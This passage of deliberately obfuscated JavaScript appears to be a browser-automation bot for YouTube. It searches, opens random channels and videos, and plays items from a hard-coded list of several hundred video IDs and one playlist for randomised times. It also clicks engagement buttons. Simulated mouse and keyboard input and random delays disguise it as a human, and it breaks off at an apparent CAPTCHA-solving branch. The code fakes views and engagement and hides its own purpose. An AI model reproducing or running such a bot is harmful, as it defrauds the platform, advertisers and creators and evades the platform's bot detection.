          log('watching..' + '.'), await Z['evaluate'](() => {
            var a1;
            (a1 = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0xb * 0x83 + -0x2ea * -0xd + 0x2041 * -0x1, 0x150f + -0x2461 + 0xf59), a1[Math['floor'](Math['random']() * a1['length'])])['setAttribu' + 'te']('id', '__scope');
          }), await v('#__scope', -0x233d + -0x735 + 0x2a72, Z), await y(Z);
          const a0 = await A(Z);
          return await wait(min((0x4bd9 * 0x3 + 0x794b * 0x1 + 0xe * -0x82d) * getRandomInt(0x1 * -0x1ac + 0x49 * 0x7a + -0x211c, 0x1eb * -0x4 + 0xd87 + -0x5d6), a0)), -0x1457 + 0x2 * -0xeb9 + -0x31ca * -0x1;
        }
        async function A(Z) {
          return await Z['evaluate'](() => {
            const a0 = {
              'Seconds': 0x3e8,
              'Minutes': 0xea60,
              'Hours': 0x36ee80,
              'Second': 0x3e8,
              'Minute': 0xea60,
              'Hour': 0x36ee80
            };
            let a1 = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
              a2 = 0x291 * 0x7 + -0x249d + -0x9a * -0x1f;
            a1 = a1['split'](a1['includes']('of') ? '\x20of\x20' : ',\x20')[-0xed * 0x3 + 0xc61 + -0x999 * 0x1]['split']('\x20');
            for (let a3 = -0x1 * -0x8c5 + 0x19fc + 0x1f * -0x11f; a3 < a1['length']; a3 += -0x95 * -0x1f + -0x182 + -0x1087)
              a2 += a1[a3] * a0[a1[a3 + (0xe72 + -0x2 * 0x60 + -0xdb1 * 0x1)]];
            return a2;
          });
        }
        async function B(Z) {
          log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await Z['goto'](channels['random'](), {
            'timeout': 0x0
          }), await v('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)', 0x200a + 0x147d + -0x3487 * 0x1, Z), log('clicked\x20vi' + 'deo\x20stuff'), await y(Z), log('page\x20netwo' + 'rk\x20idle\x20x2'), await Z['evaluate'](() => {
            const a2 = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](a4 => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == a4['getAttribu' + 'te']('class'))['slice'](-0x2498 + 0x5 * -0xd1 + -0xd91 * -0x3)['map'](a4 => Array['from'](a4['children']))['flat'](0xb * 0x151 + -0x2 * -0x266 + -0x1346)['map'](a4 => a4['childNodes'][-0x23d0 + 0xc05 + 0x17cc]['childNodes'][-0x1d65 + 0x1 * 0x2518 + 0x1b * -0x49]['childNodes'][0x2239 + 0x1351 + -0x3589]['childNodes'][-0x307 + 0x1892 + -0x44f * 0x5]['childNodes'][0x346 + -0xec4 + -0x3d5 * -0x3]);
            var a3;
            return (a3 = a2)[Math['floor'](Math['random']() * a3['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), a2['map'](a4 => a4['href']);
          }), await wait(getRandomInt(0x1 * 0x737 + -0x14fb + 0x11ac, -0x1078 + -0x1 * 0x1941 + 0x3d41)), await v('#__hookedV' + 'idToWatch', -0xce7 * -0x1 + -0x4e3 + 0x7 * -0x125, Z), log('woah\x20click' + 'ed\x20some\x20vi' + 'deoo'), await wait(-0x443 * -0x5 + 0x1a * 0x124 + 0x7a1);
          const a0 = await A(Z),
            a1 = min((0x15852 + -0xd1f3 + 0x6401) * getRandomInt(0xf80 + 0x5ee + 0xab6 * -0x2, 0x8b * 0x39 + -0x26c6 + 0x7d8), a0);
          return log('Watching\x20v' + 'id\x20for\x20' + a1 + ('ms,\x20max\x20ti' + 'me:\x20') + a0 + 'ms'), await wait(a1), -0x1603 + 0x14e1 + 0x123;
        }
        async function C(Z) {
          return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await Z['waitForSel' + 'ector']('.style-sco' + 'pe\x20ytd-ric' + 'h-grid-row'), await Z['evaluate'](() => {
            var a0;
            (a0 = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](a1 => 'contents' != a1['id']), a0[Math['floor'](Math['random']() * a0['length'])])['children'][-0x1 * -0x247f + 0x1 * 0x29e + 0x271d * -0x1]['children'][0x22f2 + 0x1299 + -0x358b]['children'][0x608 + -0x1791 + 0x1189]['children'][0x1 * -0x12ba + -0x1 * -0x180e + -0x554]['children'][0x1 * -0x8ae + -0x1884 + -0x2 * -0x1099]['setAttribu' + 'te']('id', 'gottemezez');
          }), await v('#gottemeze' + 'z', 0xf2 * 0x8 + -0xf67 * 0x2 + 0x173f, Z), await y(Z), await z(Z), -0x5c1 * 0x6 + 0x13e4 + 0xea3;
        }
        async function D(Z) {
          const aH = d;
          log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await Z['evaluate'](() => {
            let a2 = Array['from'](document['querySelec' + 'torAll']('#search'));
            document['getElement' + 'ById']('__searchBo' + 'xReal') || a2['find'](a3 => 'INPUT' === a3['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
          }), await v('#__searchB' + 'oxReal', -0x28a + 0x1a7a + -0x17f0, Z), await q['simKeyboar' + 'dType'](searchTerms[aH(0x13)]() + ''), await v('#search-ic' + 'on-legacy', -0x13 * 0x206 + -0x1 * 0x1951 + 0x3 * 0x1541, Z), log('searching.' + '..'), await Z['waitForFun' + 'ction']('Array.from' + '(document.' + 'getElement' + 'sByTagName' + '(\x22ytd-vide' + 'o-renderer' + '\x22)).length'), await y(Z);
          let a0 = await Z['evaluate'](() => {
            const a2 = {
                'seconds': 0x3e8,
                'minutes': 0xea60,
                'hours': 0x36ee80,
                'second': 0x3e8,
                'minute': 0xea60,
                'hour': 0x36ee80
              },
              a3 = (a4 = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](a6 => a6['childNodes'][0x1 * 0x83 + 0x40 + -0xc1 * 0x1]['childNodes'][-0x139c + -0x3 * -0x952 + -0x859]['childNodes'][-0x1d * -0x14a + 0x20b3 + -0x17 * 0x30c]))[Math['floor'](Math['random']() * a4['length'])];
            var a4;
            const a5 = a3['childNodes'][-0x2 * 0xb38 + 0xb06 + 0xb6f]['childNodes'][-0xd * -0x2b9 + -0x2108 + 0x25d * -0x1]['childNodes'][-0x1181 * -0x1 + -0x2181 + 0x1 * 0x1002]['ariaLabel'];
            return a3['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'),
              function(a6) {
                let a7 = a6['split'](',\x20')['map'](a9 => a9['split']('\x20'))['flat'](-0x1c55 * -0x1 + 0x640 + 0x114a * -0x2),
                  a8 = 0x340 + -0xe7 * 0x1 + 0x1 * -0x259;
                for (let a9 = -0x12bd + 0x1ba4 * -0x1 + 0x2e61 * 0x1; a9 < a7['length']; a9 += -0x16d + -0x51 * -0x6c + -0x11 * 0x1ed)
                  a8 += a7[a9] * a2[a7[a9 + (0xbb7 + 0x2261 + 0x9 * -0x51f)]];
                return a8;
              }(a5);
          });
          await v('#__hookedV' + 'idToClick', 0x9 * -0x148 + 0xcc5 + 0x1 * -0x13d, Z);
          let a1 = min((-0x12415 + -0x1b322 + 0x1 * 0x3c197) * getRandomInt(0x894 + -0x95c + 0x3 * 0x43, 0x116 + 0x19ed * -0x1 + 0x18e1), a0 + (-0xf9c + 0x79a + 0x1b8a));
          return log('watching\x20v' + 'ideo\x20for\x20' + a1 + 'ms'), await wait(a1), -0x80f + 0x1d39 + 0x1529 * -0x1;
        }
        const E = [
          'eHpl-BjXo5' + '8',
          '-PgyODlV6V' + '8',
          'S9EkXX0QYD' + 'U',
          'WvcG1OKdHW' + 'o',
          'b6gOcEwtZ8' + 'U',
          'apdtzA0Dzf' + 'k',
          'YiukDwYv2K' + '4',
          'zK-6UH5R5X' + '8',
          'bIXqNjtsEf' + '4',
          '3l253rESkw' + 'Q',
          'u6RVZKcN9z' + 'Q',
          '6ImZdwpdwT' + 'A',
          '0qPB5ANSBK' + 'c',
          '92duH3cqn1' + 'M',
          'b5lKI78fw3' + 's',
          'zpCCPZfP8L' + 'I',
          'ES7oooakr-' + 'c',
          '2eWyJ8FBvQ' + '8',
          'O4-B3OFPDf' + 'Q',
          'JFcnGk0_u7' + 'o',
          'AP7d2Ghq6d' + 'U',
          'UizEAwrZAG' + 'I',
          '0FAi5-h8Hj' + '0',
          'CNqA6IYj17' + 'k',
          'tSiKyCpwnS' + 'Y',
          'OrglyeV5xP' + 'Y',
          'BXkB-g4eCc' + 's',
          'Y53CmmpbOJ' + 's',
          'sm5MLz_IrQ' + 'k',
          'EuciRU_Ska' + '0',
          'cCbDCTLyPc' + 'E',
          'Ox7Ng5T7bm' + 'c',
          'TXTaB-dQg-' + '0',
          '3jSWaWgr_A' + '0',
          'xT8nvuxCRB' + 'E',
          '3c4Ab9EmRg' + 'Y',
          '2kScgeNOpL' + '8',
          't22jhowMom' + 'c',
          'HbcDLgkmXL' + 's',
          'JsKZ41uTeg' + 'c',
          'dfU48FRgs0' + 'g',
          '3K9ILewnUk' + 'o',
          'QmKwnRiKhD' + 'k',
          'n3nVsWsL6I' + 'k',
          'noTs52D_Mw' + 'Y',
          'A0tDR4nTTK' + '0',
          '9eBwFca-B1' + '4',
          'moasU30H5l' + 'A',
          '_Mb8oQtSBW' + 'E',
          'TNGGOgwPtc' + 'M',
          '-pYA-gjkQ8' + 's',
          '5d-dB6tZZA' + 'o',
          aI(0x17) + 'o',
          'mI7aiKDGde' + 'w',
          'D-IMDYrj35' + '4',
          'gKgFiEgghy' + 'g',
          'mjVwfjJ2nj' + 'k',
          '6auDBi-D2H' + 'M',
          'X89-SWNdIE' + 'k',
          'T5Pn4LhIwj' + 'M',
          'wVnKGSjY3i' + '8',
          'g11NJftxw1' + '4',
          '9zHirkfEKk' + 'k',
          'ZyGS_AMbIa' + '4',
          'yG6bwB17ZP' + 's',
          'aytHiLe0s6' + 'U',
          'cGe-Mpw_F1' + 'w',
          'eMK7xV_nxZ' + 'o',
          'epJ2MAKa1Y' + 'Q',
          '5BNbKKMUhE' + 'o',
          'oxpAvc6tDP' + '8',
          'jRcc-NIR2R' + 'I',
          '258btO4mFw' + '4',
          'pXjJAUvSbQ' + 'A',
          '63-irfPjh2' + 'c',
          'xbrDZAFf3Q' + 's',
          'MVHMtRlesU' + 'g',
          'zed05qfHMB' + 'I',
          'nkhkxKUHsY' + 'g',
          'n4cSAqR9H1' + 'Q',
          'gOUPndcj7z' + 'I',
          'n3HBTTDHoX' + '8',
          'XIgMFHPIXv' + '4',
          'oQHKMky-_K' + 'c',
          'zfDgTzZ2nh' + '0',
          '1PYettRo-D' + 'M',
          'jzuZuwF490' + '4',
          '2DAgWTlXae' + '8',
          'keouUYA5hI' + 'k',
          'F7i7wRlGCd' + 'c',
          'uToD2c0CdJ' + 'c',
          'Y8DzpdFZZ8' + '8',
          '-rrH657DAa' + 'o',
          'QTrEEWtDks' + '4',
          'TWTSnQDuad' + 'Y',
          'a0GUyvgnzg' + 'c',
          'eSReWZQyKd' + 'E',
          'D_5pMqdKSs' + '4',
          'm0ie8gHS00' + 'I',
          '6WosqMq9ej' + 'o',
          'i0afAOlon_' + '4',
          'j_fe6PfxW4' + 'Y',
          'GfPzi8SYr0' + 'w',
          'MSgZhNCwff' + 'M',
          'wxyBC_z6bI' + '8',
          'PkQpV-Fwhs' + 'k',
          'bVD6cWOVhN' + 'U',
          'mjZOpQlHbx' + 'M',
          'k_BXkcdbBO' + 'M',
          'X72oUsFV7q' + '0',
          'lONsILfq-W' + 'Y',
          'Bhe9PyM_s_' + 'Q',
          'Bhe9PyM_s_' + 'Q',
          'h4TBnDkX4y' + 'o',
          'PNBJyHEkfk' + '4',
          'L3iHS__ufc' + 'g',
          'm7aliUAwm_' + 'Y',
          'FuPVf85zMi' + 'w',
          'gtupAeNTDS' + 'M',
          'yyJ8zkckoB' + '8',
          'ZDTESiN1eS' + 'w',
          'Fo6x16DkoR' + 'o',
          'IAJqRxhVqO' + 'k',
          'KAgwII8TGj' + 'o',
          'o4tLCshmlb' + 'M',
          'dLj5fIupdA' + 'o',
          '_Xl_-b9P4U' + 'Q',
          'V3NxxpUUfW' + 'E',
          'J3ygeDEMnO' + 'w',
          'HcP_xmdwsl' + 'c',
          'M9g0h7px2_' + 'M',
          'b5WfUvcSgr' + 'U',
          'JGHnIshsoC' + 'E',
          'x2gfhCLHd9' + '4',
          'M5Fr8G0ma9' + 'o',
          '3sGeIBfFlC' + 'M',
          'k74y4KOJ2m' + '4',
          'pTHJB0S8E-' + 'U',
          'KaIrXJLfYP' + 'M',
          '0cisZkywhg' + 'Q',
          '0dVzItbl9E' + 'w',
          't0EqnhcSb1' + 's',
          'MuiXtvo1RY' + 'E',
          'Nj-3KC6knH' + 'w',
          'B19HbETNi5' + '8',
          'yKN_QkroH6' + 's',
          'U9ExFM1pji' + '0',
          'sONzDfjKhL' + '4',
          'n3Kj8zEfew' + 'U',
          'nXLGQ7QeoG' + 'Y',
          'OQFQiwiM-P' + 'Y',
          'UtPRpKRTtH' + 'U',
          'E56Myp0BzE' + 'E',
          '7DjOp_JM2Z' + 'w',
          'rNFLQFz_G1' + 'g',
          '1r2pKoVAdj' + 'M',
          'gm3eiv6UND' + 'M',
          'yOiROfjxzX' + 'o',
          'lt2AcxC_ap' + 'g',
          'bObEme2BDO' + 'E',
          '6Ut6HbJmW4' + 'w',
          'fUs0TtQQTo' + '0',
          '_phHS3FAgW' + 'Q',
          '1f8sU4l3dP' + '4',
          'HwTSLUd53K' + '8',
          'EpP2ymD_QG' + 'A',
          'TQ69QFqmbo' + 'I',
          'wA8BqUka_u' + '0',
          'bc8Ey-vuR5' + 'M',
          'PZ_uLi7ULl' + '0',
          'smu5FsnhwF' + '4',
          'dv1JluwoOb' + 'c',
          'nHotP0jbcv' + 'A',
          aJ(0x6, 'TZ0h') + 'M',
          'SeP-OZAiPb' + 'c',
          'v52PClvMFt' + 'k',
          '3loLqIPxTS' + '0',
          'jVu9mOzbSq' + 'U',
          '73SAN1vOrV' + 'k',
          'YLPxp4ntym' + 's',
          aI(0x15) + 'Q',
          'CsxlLMb6Uj' + 'o',
          'uafGOfwzpa' + 'Q',
          'XIr8qotHOI' + 'E',
          'EcoPCWC3Uh' + 'o',
          'AhOwyT8aIh' + 'g',
          't-Ox7lI5UH' + 's',
          'i08qNmssXe' + 'Q',
          'QrJIU09eD-' + 'g',
          'QvNNCQ-8Rp' + 'E',
          'k5gjnjDFAZ' + 's',
          'h_NQ3y1ek8' + 'U',
          'evPsJlNLy_' + '4',
          'qEPTydgwh4' + 's',
          'LB685ckhuf' + 'E',
          'Lj1EcSMGey' + '0',
          'OE19r7MIMW' + 'Q',
          'u8E3p0Vy-P' + 'Y',
          'f4a5OPFQa7' + 'k',
          'XDo7Q7yUEt' + 'k',
          'Vw_9zw0qHI' + 'c',
          'KGT5nbDsI_' + '8',
          'E008Eql59M' + 'Q',
          'wSOFdefX47' + 'A',
          '2xcv7q3QhR' + 'E',
          'hgfvmcBkc0' + '4',
          '0wP7csnX7k' + '4',
          'Xo0R8WiRSb' + '4',
          '8zNp8EOpGd' + '4',
          'sWYhIJZmoS' + 'E',
          'YdG8U1W-bX' + '0',
          'QeDsoSNml-' + 'c',
          'xW5q77El0x' + '8',
          'ZF14issJFE' + 'Y',
          'TRglEGLLKX' + 'o',
          'UE0SXc5k1e' + 'g',
          '6VY65D8f3D' + 'Q',
          'Iwxuob4fA8' + 'Q',
          'M4elJHCUIi' + 's',
          'GY9WWhO504' + 'k',
          'eErUSxmLDw' + '8',
          'ITQfAfzLj3' + 'I',
          'vbDrCL2FuL' + 'g',
          'KyQ_sUgtbK' + 'U',
          'lbEJcipUp8' + 'I',
          '2SqCn2LreN' + 'g',
          '1i-G2TUn41' + '0',
          's0ru6uK7vi' + '8',
          'gOxiE5UAAD' + 'w',
          'lx1rOOjekc' + '8',
          '5VYN2zA-Si' + 'k',
          'q9rLWEAzoo' + 'k',
          '4KSm3IY7Xz' + 'g',
          'fMqRu_ON-D' + 'E',
          'GfvShU6Sy9' + 'A',
          'OHzOmi1b60' + 'Y',
          'D9oTUKT-_n' + 'A',
          '_BrT2PlUiw' + '0',
          'kuuI4LzKgm' + 'I',
          '78dymyg88r' + 'M',
          'mi0nGt2B-q' + 'o',
          'HaI7BjnwnO' + 'c',
          'xlAEOkIuy7' + 'Y',
          '3VmtckvTXl' + 'U',
          'ed7TWHKDr4' + 'E',
          '2LfTjyVtbf' + 'U',
          'STHlCkloyv' + 'E',
          '-BI_-6YnM6' + 'Y',
          'LSK_G1qCQw' + 'M',
          '4tzqIl6EKV' + 'k',
          '9DshU55EiV' + '8',
          'mBtaEI_6e8' + 's',
          '960lvuduwY' + 'w',
          'XWJH-6J5Ee' + 'g',
          'XLS4qmyCAX' + 'g',
          '8cJDYeRiLn' + 'k',
          'cCaIVrltHz' + 'w',
          '8X2fF4pgM0' + 'E',
          '6s8Xm4wylr' + '4',
          'eFceshvavn' + 'o',
          '2h4g7euqR-' + 'U',
          'ujiBqXnn92' + '8',
          'w9F2NST-9j' + 's',
          'w-oc7F5Mmy' + 'U',
          'UYrmqL3cOD' + 'U',
          '4QB59etj0I' + 'o',
          'MY9MTNgXcN' + 'o',
          'ISBmcKDS5C' + '8',
          'ogIb7A7tvW' + '0',
          '-L583IZF6s' + 'k',
          'NbeKQq29ZL' + '0',
          'SPplDxd74F' + 's',
          'MHGV8QmpAz' + 'k',
          'iWzezFWpU7' + 'A',
          'NNCQt1rXXE' + 'Y',
          'bcb_ZhJJK8' + 'g',
          '3KoZGQiY6N' + 'o',
          'aSaXQH8F1_' + 'A',
          'V5nMOhI62o' + 'w',
          'JvlPjRUdId' + '0',
          '2gQHuClLCb' + '0',
          '5e-qDy-uUJ' + 'E',
          'oE8vC0QEWU' + 'E',
          '7cQken99yu' + 'o',
          'pmzu080j7r' + 'I',
          'sVy9F4whP6' + 'o',
          'MJrkylk7iE' + 'c',
          'XYjsTxi6oE' + '8',
          'mKlMouB6tp' + '0',
          'o2yunZQley' + 'A',
          'oRryU9F9Lv' + 's',
          'uzzK-052H0' + 'c',
          'VSvA4rCe-4' + 'M',
          'XURH2u_0fM' + 'I',
          'yfpVL2g_tk' + 'o',
          'AuEEjQ8x9o' + 'w',
          'wWkviY8zBr' + 'c',
          'zt_eubHWhx' + 'c',
          'O_7_BGU3u_' + '0',
          'QFDKBxmOn3' + 'Y',
          'w6gccNWXXv' + 'g',
          'VdNJxbrqdX' + 's',
          'wbi5Dxebvn' + 'I',
          'XEFOREYrJg' + 'k',
          'I2rcRta7WJ' + '0',
          'OP5KGfXHX_' + 'A',
          'w2MUMbbwlm' + 'o',
          'X3bF0nd6kf' + 'w',
          'WDDAhASf9j' + 'w',
          'fRwcV8gjbc' + 'w',
          '7T63gaRThr' + '0',
          'zC8AWIwhbf' + 's',
          'JSkVE0n-ee' + 'o',
          'qiQA5pWWRt' + 'U',
          'QdXCjZtfXu' + 'c',
          'vlBji8TOax' + 'o',
          'pBx_5CbIcp' + 'o',
          'L1Oy5F6ZMO' + 'Q',
          'P0NjLaBed-' + 'E',
          'DR16C4-keB' + '0',
          'LGmpIpu9eD' + 'w',
          'rNkX_A4kBA' + 'Q',
          'QztVMjrEk4' + '0',
          'uOM6m6KL5d' + '4',
          'g-Aju8xrrO' + 'E',
          'DfkDbFk_x9' + '8',
          'Y4NLDaowD6' + 'I',
          'ALSZnqQTuJ' + 'o',
          'xUmB6BpZBE' + 'w',
          'SxNOcZ1s85' + '8',
          '-noeCjO416' + 'k',
          'taPJqXBI8V' + 'Y',
          'YxqbkMi1Is' + '4',
          'vnJTyve2r-' + '4',
          '44lRVYQ38E' + 'Q',
          'QOv1N1X5J-' + 'g',
          'jNjREs7ODT' + 'g',
          'U30ToJo3dd' + 'k',
          'rm7lNIIOQC' + 'Y',
          'mGU6sOPlYv' + 'c',
          '6pwxUXdt6T' + 'Q',
          '6MkJRee35a' + 'Q',
          'LVbf7U9WAI' + 'c',
          'gPbhFvEeJ3' + 'M',
          aJ(0x4, '2e(V') + 'A',
          'L0KQJqfwJJ' + 'Y',
          'GWr33_u0VK' + 'c',
          '4ud3ZPfWkH' + 's',
          'dxSrySC4XM' + 'c',
          'iIM2KZC69W' + '0',
          '8DuJ3BAwME' + 'o',
          'm3BAhe1wsl' + 'Y',
          '02U_3pAZxM' + '8',
          '0e7nidPa97' + 'g',
          'TixW__6Eer' + 'o',
          'q46W8MTRTC' + 'E',
          'Jdxp04Je1O' + 'w',
          'HfP4TO3gfN' + '0',
          '4dUJaeB0qL' + '8',
          'xnL-fRJ3RZ' + 'o',
          'yJbD0Df45u' + 'Q',
          '-pGw8RkSSB' + 'k',
          '7cy86Njsis' + 'M',
          'jbgqvxtauo' + '4',
          'N8M00JjSVI' + 'I',
          'MfR5q6Td3R' + 'c',
          'eHwcx94wcp' + 's',
          'olDgVFgAgP' + 'o',
          'eAAd5BmzXz' + 'M',
          'xgTjQ2sGXd' + '4',
          'ipny6JUbzw' + 's',
          'WOwQ0UxbRj' + '4',
          'h0PKFed2GB' + 's',
          'JxdOrgzq7Z' + '8',
          '-VgpSWWW-8' + 'w',
          '-ix4OizkAn' + 's',
          'd3CRE9y3YV' + 's',
          '4QZlfXxorJ' + 'o',
          'YlDpg8aCs5' + 'M',
          'Qe5WT22-AO' + '8',
          'b_rjBWmc1i' + 'Q',
          '9yjZpBq1XB' + 'E',
          'hPx-RiBKXt' + 'Q',
          'UMqLDhl8PX' + 'w',
          'DlJEt2KU33' + 'I',
          'BWeqoARup-' + 'Q',
          '2Dx76lD8Sc' + 'c',
          'j_nI6G3ZDi' + 'E',
          'zvcUYYN1sx' + 'w',
          'cWRkYo1S3L' + '4',
          'cWRkYo1S3L' + '4',
          'bxC_PN3SRv' + 'I',
          '94m93T_5JL' + 'M',
          'RBSHAH4iWU' + '8',
          'RBSHAH4iWU' + '8',
          'RBSHAH4iWU' + '8',
          'bo9fTeXvSi' + 'A',
          'z6LqXiAK-8' + '0',
          '5tbOspjJ5f' + '0',
          'twQ6kKjtBk' + 'Y',
          'Ig17K38Fy0' + 'Y',
          'ZdlrVDwn_a' + '4',
          aK(0x1b) + 'g',
          'acAvMGQtln' + 'M',
          '8XkcbdSRdO' + '0',
          '0e3GPea1Ty' + 'g',
          'zxYjTTXc-J' + '8',
          '9bqk6ZUsKy' + 'A',
          'plSyrHqUh7' + '8',
          'HkvQywg_uZ' + 'A',
          'lADBHDg-Jt' + 'A',
          'I2O7blSSzp' + 'I',
          'kd2KEHvK-q' + '8',
          'CbUjuwhQPK' + 's',
          'fb7T1v_VHp' + 'E',
          'SpeSpA3e56' + 'A',
          'RQdxHi4_Pv' + 'c',
          'nx2-4l4s4N' + 'w',
          'tUTCq3iiw_' + '4',
          'VDa5iGiPgG' + 's',
          'S-sJp1FfG7' + 'Q',
          'Hm1YFszJWb' + 'Q'
        ];
        async function F(Z) {
          const aL = c;
          await Z['goto']('https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + E['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y')), await v('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + aL(0x9) + 'ec-touch-f' + 'eedback-sh' + 'ape__fill', -0x216f + -0x1bee + 0xa * 0x623, Z), await v('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill', -0x694 * 0x1 + 0x1 * 0x7e6 + 0x151 * -0x1, Z);
          const a0 = setInterval(async () => {
            log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await Z['evaluate'](() => {
              setTimeout(() => {
                document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on') ? .['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
              }, -0x8 * -0x35c + 0x594 + 0xa5e * -0x2 + (0x1 * 0x1834 + 0x15 * -0x95 + -0x27 * 0x35) * Math['random']());
            });
          }, 0x119 * -0x1e + -0x3403 + -0x1675 * -0x5);
          await wait(0xbb5 * 0xb6 + 0x1 * 0x81625 + -0xbd4f3);
          try {
            Z['$']('#__lllll') && await v('#__lllll', 0x21a9 + -0x72c + -0x1a7c, Z);
          } catch (a1) {}
          return await wait((-0xa6e7 * -0x1 + -0x19e3b + 0x1e1b4) * getRandomInt(-0x6 * 0x217 + -0x2091 + 0x2d1f, -0x2588 * 0x1 + -0x1955 + 0x3ef6)), clearInterval(a0), -0x1701 + 0xc0c + 0x57b * 0x2;
        }
        const G = [
          D,
          B,
          C,
          F
        ];
        async function H() {
          return await wait(-0x1 * 0x7cf + 0xd9e + -0x507 + (-0x66e + -0x1 * -0x15d7 + -0xea1 * 0x1) * random()), 0x225b + 0x79 * -0xd + -0xf9 * 0x1d;
        }
        async function I(Z, a0, ...a1) {
          Check['ia'](Z, Page, Frame), Check['nes'](a0), Check['all'](a1, 'string');
          let a2 = [];
          ! function a5(a6) {
            a2['push'](a6);
            for (const a7 of a6['childFrame' + 's']())
              a5(a7);
          }(Z['mainFrame']());
          const a3 = 'qkdjuqwyhd' + 'uqjidwqdjq' + 'hn' + GSI++,
            [a4] = await Promise['race'](a2['map'](a6 => setWait(a6, a0, a1, a3)));
          return await a4['$']('.' + a3);
        }
        async function J(Z, a0, a1, a2 = -0x14dc + 0x18cf * 0x1 + -0x1 * 0x3f2) {
          if (!Z['fakeUserAc' + 'tion'])
            return warn('Requires\x20F' + 'UA\x20hoist!');
          Check['inst'](a0, ElementHandle), Check['nes'](a1), '_click' === a1 ? await Z['fakeUserAc' + 'tion']['simClickEl' + 'ement'](a0) : '_view' === a1 ? await Z['fakeUserAc' + 'tion']['simMouseMo' + 'veToElemen' + 't'](a0) : await K(Z, [
            'type',
            a1
          ]), a2 && a0 && await a0['dispose']();
        }
        async function K(Z, ...a0) {
          if (!Z['fakeUserAc' + 'tion'])
            throw new Error('Controller' + '\x20still\x20not' + '\x20hoisted!');
          Check['cust'](a0, a1 => a1['every'](a2 => 'string' == typeof a2 || Array['isArray'](a2)));
          for (let a1 of a0)
            if ('object' == typeof a1) {
              const a2 = a1['slice'](0x1b * -0x56 + -0xe82 * 0x1 + 0x1795),
                a3 = a1[0x1c57 + -0x2 + -0x1c55];
              switch (flags['debug'] && log('[DEBUG]\x20Ex' + 'ecuting\x20ac' + 'tionType:', a3, 'with\x20argum' + 'ents:', a2), a3) {
                case 'waitfunc':
                  {
                    const [a4, a5] = a2;
                    'string' != typeof a4 && warn('[WATCHDOG]' + '\x20FunctionS' + 'tring\x20fail' + 'ure\x20here:', a2),
                    a5 instanceof Page || a5 instanceof Frame || warn('[WATCHDOG]' + '\x20Scope\x20fai' + 'lure\x20here:', a2),
                    await a5['waitForFun' + 'ction'](a4);
                  }
                  break;
                case 'waitsel':
                  {
                    const [a6, a7] = a2;
                    'string' != typeof a6 && warn('[WATCHDOG]' + '\x20FunctionS' + 'tring\x20fail' + 'ure\x20here:', a2),
                    a7 instanceof Page || a7 instanceof Frame || warn('[WATCHDOG]' + '\x20Scope\x20fai' + 'lure\x20here:', a2),
                    await a7['waitForSel' + 'ector'](a6);
                  }
                  break;
                case 'type':
                  if ('string' != typeof a2[-0x1781 * 0x1 + 0x2 * 0x851 + 0x6df] && (warn('[WATCHDOG]' + '\x20Text\x20fail' + 'ure\x20here:', a2), 'number' == typeof a2[-0x1836 + 0x8 * 0x2c2 + 0x226])) {
                    const a8 = a2[0x614 + 0x16cf + 0x11 * -0x1b3] + '';
                    warn('[WATCHDOG]' + '\x20Recoverab' + 'le\x20error,\x20' + 'state:', a2[0x56 * -0x61 + -0xac * 0x14 + 0x2e06 * 0x1], a8), a2[-0xe4a + -0x1f50 + -0x2 * -0x16cd] = a8;
                  }
                  a2[0x1ba0 + 0x458 + 0x491 * -0x7] && 'object' != typeof a2[-0x5 * -0x21d + 0xdb0 + -0x1840] && warn('[WATCHDOG]' + '\x20option\x20ob' + 'ject\x20failu' + 're\x20here:', a2), await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dType'](a2[0x7 * 0xf1 + 0x4 * -0x1f3 + 0x135]);
                  break;
                case 'stype':
                  {
                    const a9 = a2['shift']();
                    Check['nes'](a9);
                    const aa = a2['shift']();
                    Check['ia'](aa, Page, Frame);
                    const ab = a2['shift']();
                    Check['nes'](ab),
                    isValidPruneArray(a2) || warn('[WATCHDOG]' + '\x20pruning\x20t' + 'echniques\x20' + 'failed\x20in\x20' + 'stype:', ab, aa, a9, a2),
                    log('[debug]\x20in' + '\x20to\x20find:', aa, ab, ...a2);
                    const ac = await I(aa, ab, ...a2);
                    log('[debug]\x20fo' + 'und\x20elemen' + 't', ac),
                    await J(Z, ac, a9, 0x541 + -0x11a2 + 0xc62);
                  }
                  break;
                case 'solveV2':
                  {
